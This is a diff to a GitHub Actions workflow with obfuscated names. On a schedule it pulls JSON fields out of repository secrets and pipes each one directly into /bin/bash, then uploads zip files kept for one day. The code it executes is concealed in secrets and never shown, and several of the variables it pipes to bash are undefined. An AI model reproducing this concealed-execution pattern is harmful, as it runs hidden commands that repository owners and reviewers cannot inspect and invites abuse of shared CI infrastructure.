@@ -1,9 +1,9 @@
 name: gracevercel343
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '52 1/6 * * *'
 
+  schedule:
+    - cron: '9 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: gracevercel343
         env:
-          sma0619: ${{ secrets.sma0619 }}
+          dhb529: ${{ secrets.dhb529 }}
         run: |
-          echo $sma0619 | jq -r .rtl22319 | /bin/bash
-          echo $ztrwn01 | jq -r .zdu3006 | /bin/bash
-          echo $fnqee50596 | jq -r .wxjrq1846 | /bin/bash
-          echo $k48943 | jq -r .mmg4602 | /bin/bash
-          echo $o21 | jq -r .gyor19 | /bin/bash
+          printf '%s' "$dhb529" | jq -r .ggaxb2996 | /bin/bash
+          printf '%s' "$q424" | jq -r .hbm7 | /bin/bash
+          printf '%s' "$kc32" | jq -r .c97222 | /bin/bash
+          printf '%s' "$ue305" | jq -r .y41 | /bin/bash
+          echo $uqice98 | jq -r .sgwq337 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: tMVBc3CH
+          path: "*.zip"
+          retention-days: 1
